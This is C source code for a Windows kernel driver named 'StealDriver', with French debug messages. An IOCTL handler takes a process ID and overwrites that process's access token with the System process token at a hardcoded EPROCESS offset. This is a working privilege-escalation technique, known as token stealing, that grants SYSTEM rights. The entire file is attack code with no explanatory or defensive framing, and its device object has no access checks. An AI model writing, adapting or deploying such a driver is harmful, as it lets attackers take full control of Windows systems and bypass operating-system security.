#include <ntddk.h>
#include "steal.h"

#define DEVICE_NAME  L"\\Device\\StealDriver"
#define SYMLINK_NAME L"\\??\\StealDriverLink"
#define SYSTEM_PID 4
#define OFFSET_TOKEN 0x4b8
#define EX_FAST_REF_MASK (~(ULONG_PTR)0xF)

VOID StealToken(_In_ ULONG TargetPid)
{
    PEPROCESS targetProcess = NULL;
    PEPROCESS systemProcess = NULL;
    NTSTATUS status;

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)SYSTEM_PID, &systemProcess);
    if (!NT_SUCCESS(status)) {
        DbgPrint("Steal: process System introuvable 0x%08X\n", status);
        return;
    }

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)TargetPid, &targetProcess);
    if (!NT_SUCCESS(status)) {
       DbgPrint("Steal: PID cible %lu introuvable 0x%08X\n", TargetPid, status);
        ObDereferenceObject(systemProcess);
        return;
    }

    PULONG_PTR systemTokenField = (PULONG_PTR)((ULONG_PTR)systemProcess + OFFSET_TOKEN);
    PULONG_PTR targetTokenField = (PULONG_PTR)((ULONG_PTR)targetProcess + OFFSET_TOKEN);

    DbgPrint("Steal: token System brut=0x%p masque=0x%p\n",
             (PVOID)*systemTokenField,
             (PVOID)(*systemTokenField & EX_FAST_REF_MASK));

    *targetTokenField = *systemTokenField;
    DbgPrint("Steal: token copie vers PID %lu\n", TargetPid);

    ObDereferenceObject(targetProcess);
    ObDereferenceObject(systemProcess);
}

NTSTATUS StealCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS StealDispatchIoControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
    PIO_STACK_LOCATION stackLocation;
    NTSTATUS status = STATUS_SUCCESS;

    UNREFERENCED_PARAMETER(DeviceObject);
    stackLocation = IoGetCurrentIrpStackLocation(Irp);

    if (stackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_STEAL_TOKEN) {
        PULONG inBuf = (PULONG)Irp->AssociatedIrp.SystemBuffer;
        ULONG inLen = stackLocation->Parameters.DeviceIoControl.InputBufferLength;
        if (inBuf == NULL || inLen < sizeof(ULONG))
            status = STATUS_INVALID_PARAMETER;
        else
            StealToken(*inBuf);
    } else {
        status = STATUS_INVALID_DEVICE_REQUEST;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

VOID StealUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, SYMLINK_NAME);
    IoDeleteSymbolicLink(&symLink);
    if (DriverObject->DeviceObject != NULL)
        IoDeleteDevice(DriverObject->DeviceObject);
    DbgPrint("Steal: unloaded\n");
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    NTSTATUS status;
    UNICODE_STRING deviceName, symLink;
    PDEVICE_OBJECT deviceObject = NULL;

    UNREFERENCED_PARAMETER(RegistryPath);

    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    status = IoCreateDevice(DriverObject, 0, &deviceName,
                            FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);
    if (!NT_SUCCESS(status))
        return status;

    RtlInitUnicodeString(&symLink, SYMLINK_NAME);
    status = IoCreateSymbolicLink(&symLink, &deviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(deviceObject);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = StealCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = StealCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = StealDispatchIoControl;
    DriverObject->DriverUnload = StealUnload;
    deviceObject->Flags |= DO_BUFFERED_IO;
    deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    DbgPrint("Steal: loaded\n");
    return STATUS_SUCCESS;
}
